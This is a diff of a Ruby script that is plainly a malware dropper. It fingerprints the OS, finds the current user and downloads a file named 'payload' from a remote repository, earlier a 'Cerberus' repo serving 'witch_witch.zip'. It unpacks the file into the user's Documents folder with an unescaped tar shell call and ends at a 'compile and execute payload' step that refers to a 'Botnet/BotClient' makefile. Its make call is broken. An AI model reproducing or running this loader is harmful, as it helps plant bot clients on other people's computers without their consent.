@@ -21,8 +21,7 @@ require 'etc'
 include Config
 
 #global variables
-$source_repo = "https://github.com/Voodoo/Projects/Cerberus/"
-
+$source_repo = "https://aur.archlinux.org/packages/ar/archey/"
 
 ##Fingerprint the operating system
 def fingerprint
@@ -50,8 +49,6 @@ def dl(file_name)
 
     success = 0
 
-    puts "Downloading zip file"
-
     open(file_name, 'wb') do |file|
     success = 1
     file << open($source_repo + file_name).read
@@ -61,7 +58,7 @@ def dl(file_name)
 
 end
 
-
+=begin
 ##Unpack the file
 def unpack(file, destination)
 
@@ -85,11 +82,17 @@ def unpack(file, destination)
     return success
 
 end
+=end
+
+def unzip(f, d)
+    `tar -xzvf #{f} -C #{d}`
+    return 1
+end
 
 
 #Compile and execute the downloaded code
-def compile_execute(makefile_path)
-
+def compile_execute(make_file)
+    `make {#make_file}`
 end
 
 
@@ -98,11 +101,11 @@ end
 
 osversion = fingerprint() #call to fingerprint() function
 username = getUser() #get current logged in user
-payload = "witch_witch.zip" #name of payload
+payload = "archey.tar.gz" #name of payload
 
 if osversion > 0
 
-   target_dir = "/home/" + username + "/Documents/"
+   target_dir = "/Users/" + username + "/Documents/"
 
    puts "[*] Fetching payload"
    if dl(payload) > 0
@@ -113,13 +116,14 @@ if osversion > 0
 
 
    puts "[*] Unpacking..."
-   if unpack(payload, target_dir) > 0
+   if unzip(payload, target_dir) > 0
       puts "[+] archive extracted to " + target_dir
    else
 	abort("[-] Extraction Failed")
    end
 
    puts "[*] Compile and execute payload"
+   #compile_execute(target_dir + "Botnet/BotClient" + "makefile")
 
 else
 
